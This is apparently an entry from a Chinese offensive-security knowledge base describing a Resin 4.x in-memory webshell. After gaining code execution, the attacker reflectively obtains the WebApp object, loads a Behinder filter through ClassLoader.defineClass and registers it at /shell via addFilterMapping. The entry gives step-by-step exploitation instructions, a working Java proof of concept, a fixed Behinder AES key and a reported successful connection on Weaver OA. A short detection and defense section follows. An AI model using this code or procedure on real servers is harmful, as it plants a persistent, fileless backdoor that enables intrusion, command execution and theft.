---
id: web-java-component-resin-filter-memshell-webapp-addfiltermapping
title: Resin 4.x Filter 内存马：反射 WebApp.addFilterMapping 动态注册恶意 Filter，配合 ClassLoader.defineClass 注入冰蝎 Filter
type: scenario
domain: web
path: web/java/component
technique: resin-webapp-addfiltermapping-filter-memshell
aliases:
- Resin 内存马
- Resin Filter 内存马
- com.caucho.server.webapp.WebApp
- addFilterMapping 内存马
- FilterMapping 注入
- Resin 冰蝎内存马
tags:
- java
- resin
- caucho
- memshell
- filter
- addfiltermapping
- webapp
- behinder
- persistence
cve: []
severity: high
confidence: high
status: verified
affected_versions: Resin 4.x（原文环境 4.0.66）
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V566
  verified_at: '2026-11-12T09:19:06+08:00'
  notes: 已对照原文 24 张图核对：图22 getWebApp 源码，图23 eval 得 WebApp[production/webapp/default/ROOT] 且 _filterMapper/_filterMap 中存在 FilterMapping{pattern=/hello,name=HelloFilter}，图24 冰蝎 v4.0.6 已连接 http://192.168.111.138:8080/shell 并读取环境变量。卡片链路 ServletInvocation.getContextRequest→getWebApp→ClassLoader.defineClass(SystemClassLoader)→new FilterMapping/setFilterClass/setFilterName/createUrlPattern.addText(/shell).init→webApp.addFilterMapping 与原文代码一致，冰蝎密钥 e45e329feb5d925b 与过滤器代码一致。affected_versions 为原文环境 Resin 4.0.66。dedup top 为 Tomcat 动态 Filter、Jetty9/Jetty XML Filter 内存马卡，容器 API 完全不同，非同链；dup-scan 无涉及 pair。未验证点：未复现。
---

## 一句话结论

在 Resin 4.x 上已有一次代码执行后，可通过 `ServletInvocation.getContextRequest().getWebApp()` 取到当前 `WebApp`，用 `ClassLoader.defineClass` 把恶意 Filter 字节码载入 JVM，再构造 `FilterMapping`（URL 模式如 `/shell`）调用 `webApp.addFilterMapping()` 注册；Filter 驻留内存、随容器存活，请求 `/shell` 即进入冰蝎等恶意 Filter，原文在泛微 OA 上实测成功连接冰蝎 4.0.6。

## 原理

- **WebApp 可达**：`com.caucho.server.dispatch.ServletInvocation.getContextRequest()` 返回 `HttpServletRequestImpl`，其 `getWebApp()` 返回当前应用 `com.caucho.server.webapp.WebApp`；WebApp 内部用 `_filterMapper`/`_filterMap`（`List<FilterMapping>`）保存过滤器与 URL 的映射关系，每条 `FilterMapping` 含 `_urlPattern`、`_filterName`、`_filterClassName`、`_filterClass` 等字段。
- **动态注册**：Resin 的 `WebApp.addFilterMapping(FilterMapping)` 是成员方法，运行期调用即可把新的过滤器映射加入内存中的过滤器链；`FilterMapping.createUrlPattern()` 返回 `FilterMapping.URLPattern`，`addText("/shell")` + `init()` 设置 URL 模式。注册后请求 `/shell` 会先经过该 Filter 的 `doFilter`。
- **恶意 Filter 载入**：原文把冰蝎 Filter 编译成 class，Base64 后经 `ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class)` 反射调用（`setAccessible(true)`）在系统类加载器中定义类，取 `evilFilter.getName()` 作为 `filterClass`/`filterName`。由于 Filter 类已定义，Resin 实例化时无需再从磁盘加载。
- **为什么持久**：过滤器映射只存在于 WebApp 内存对象中，不写 `web.xml`，容器不重启则一直生效；重启后丢失（非落地型 webshell，隐蔽性较强）。
- **为什么能命令执行**：恶意 Filter 在 `doFilter` 中解密请求体（冰蝎 AES 密钥）、`defineClass` 加载内存字节码并实例化，等价于一个通用的加密通道内存马，后续只靠 HTTP 请求即可执行任意代码/命令。
- **触发时机**：内存马注入逻辑通常放在反序列化 translet 的静态初始化块（`AbstractTranslet`）或 BeanShell/JSP 代码中，请求线程内一次性完成定义类与注册映射。

## 触发条件

- 目标为 Resin 4.x（原文 4.0.66），攻击者已获得 JVM 内代码执行（如泛微 BshServlet、WorkflowServiceXml XStream 反序列化）。
- JDK 允许反射调用 `ClassLoader.defineClass`（JDK 8 常见可用；高版本可能受模块化限制）。
- 应用线程上下文可取到 request（`ServletInvocation.getContextRequest()` 可用）。
- 目标容器未部署会阻断动态 Filter 注册或类定义的 RASP/安全管理器。

## 利用步骤

1. 准备恶意 Filter：编写实现 `javax.servlet.Filter` 的冰蝎/哥斯拉 Filter，编译为 class 并 Base64 编码。
2. 取 WebApp：反射调用 `ServletInvocation.getContextRequest()`，再对返回对象调用 `getWebApp()` 得到 `WebApp`（原文调试确认 `WebApp[production/webapp/default/ROOT]`）。
3. 定义 Filter 类：`ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class)` → `setAccessible(true)` → `invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length)`。
4. 构造映射：`new FilterMapping()`，`setFilterClass(name)`、`setFilterName(name)`，`createUrlPattern().addText("/shell")` 后 `init()`。
5. 注册：`webApp.addFilterMapping(filterMapping)`。
6. 连接：访问 `http://target/shell`，用冰蝎客户端（密钥 `e45e329feb5d925b`）连接，成功后获得命令执行/文件管理等功能。
7. 持久化说明：容器重启后内存马消失，需要在入口再次触发注入或另写落地文件。

## PoC

```java
Object req = Thread.currentThread().getContextClassLoader()
        .loadClass("com.caucho.server.dispatch.ServletInvocation")
        .getMethod("getContextRequest").invoke(null);
com.caucho.server.webapp.WebApp webApp =
        (com.caucho.server.webapp.WebApp) req.getClass().getMethod("getWebApp").invoke(req);

byte[] evilBytes = java.util.Base64.getDecoder().decode(FILTER_CLASS_B64);
java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(
        "defineClass", byte[].class, int.class, int.class);
defineClass.setAccessible(true);
Class<?> evilFilter = (Class<?>) defineClass.invoke(
        ClassLoader.getSystemClassLoader(), evilBytes, 0, evilBytes.length);

com.caucho.server.dispatch.FilterMapping fm = new com.caucho.server.dispatch.FilterMapping();
fm.setFilterClass(evilFilter.getName());
fm.setFilterName(evilFilter.getName());
com.caucho.server.dispatch.FilterMapping.URLPattern up = fm.createUrlPattern();
up.addText("/shell");
up.init();
webApp.addFilterMapping(fm);
```

恶意 Filter 本体示例（冰蝎 4.x 风格）：`doFilter` 中 `Cipher.getInstance("AES")` 用固定密钥解密请求体、`ClassLoader.defineClass` 加载并 `newInstance().equals(pageContext)` 后 `filterChain.doFilter`。原文在泛微 OA 环境注入后，浏览器访问 `/shell`、冰蝎显示“已连接”并读取环境变量（图 24）。

## 变体与关联

- Filter 类型可用冰蝎、哥斯拉、自定义加密通道；也可注册 Servlet/Listener 型内存马（Resin 对应 API 不同）。
- 注入载体：反序列化 translet 静态块、BshServlet 脚本、JSP 写入、表达式注入；本文章使用 `AbstractTranslet` 包装注入代码。
- 与 Resin 回显卡共用 `ServletInvocation` 取请求对象；拿到 WebApp 只是多一步 `getWebApp()`。
- 检测对抗：内存马不落盘，传统文件查杀无效；需查 WebApp 过滤器列表、JVM 类列表（`defineClass` 的匿名类）、加密请求特征。

## 检测与防御

- 升级 Resin/修复上层 RCE 入口（BshServlet、XStream）是根本；移除不必要的 BeanShell 与 XFire 服务。
- RASP 拦截对 `ClassLoader.defineClass` 的反射调用、`WebApp.addFilterMapping` 非常规调用、以及 `com.caucho.server.dispatch.ServletInvocation` 反射链。
- 运行时排查：heap dump/attach 检查 `WebApp._filterMapper._filterMap` 是否有未知 FilterMapping（filterClass 指向无名类）、JVM 中是否存在无对应 class 文件的 Filter 类。
- 流量侧：访问固定路径（如 `/shell`）的加密二进制 POST、请求/响应体高熵；对 `cmd` 头与异常 AES 载荷告警。
- 容器重启会清除该内存马，可作为应急处置手段；同时轮换应用凭据并审计上层漏洞利用痕迹。
